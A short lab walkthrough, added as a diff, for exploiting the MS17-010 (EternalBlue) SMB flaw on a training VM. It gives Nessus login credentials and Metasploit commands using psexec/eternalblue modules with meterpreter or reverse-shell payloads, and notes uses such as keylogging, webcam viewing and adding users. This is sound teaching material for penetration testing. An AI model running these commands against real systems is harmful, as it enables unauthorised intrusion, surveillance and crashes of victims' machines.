@@ -1,0 +1,33 @@
+EternalBlue Writeup.
+Open Nessus on Slingshot VM (localhost:8834 ) UN: root PW: !nessuspw!
+Go to scans and look at recent scan
+Identify the vulnerable host (VULNERABLE TO MS17_010)
+Open Metasploit- msfconsole in terminal
+Type:
+use exploit/windows/smb/ms17_010_psexec 
+set RHOST [IP OF VULNERABLE HOST]
+set PAYLOAD windows/meterpreter/reverse_tcp or set PAYLOAD windows/shell/reverseTCP
+exploit
+
+or                                                                                   				                 use exploit/windows/smb/ms17_010_eternalblue
+set RHOST [IP OF VULNERABLE HOST]
+set VerifyTarget false
+exploit
+
+Using ms17_010_eternalblue will bluescreen the victim- a good demonstration of what can happen if you aren’t careful when pentesting- VM can be restarted as soon as blue screen shows up
+Using payload meterpreter will open a meterpreter shell which allows for keylogging, webcam viewing and others. Type help in the meterpreter prompt for a list of commands
+GetUid in meterpreter will show what user is currently being used.
+Using shell payload will open a command prompt window- allows to view files, download files and perform remote commands such as adding users.
+
+
+
+
+
+
+
+
+Exploit
+Use Nessus (go to localhost:8834 in firefox) to identify the vulnerable host UN:root PW:!nessuspw!`
+Use Metasploit framework to attack the host using the identified vulnerability (SAME AS NHS HACK )with either windows/meterpreter/reverse_tcp or windows/shell/reverse_tcp
+Break the machine when you’re in.
+
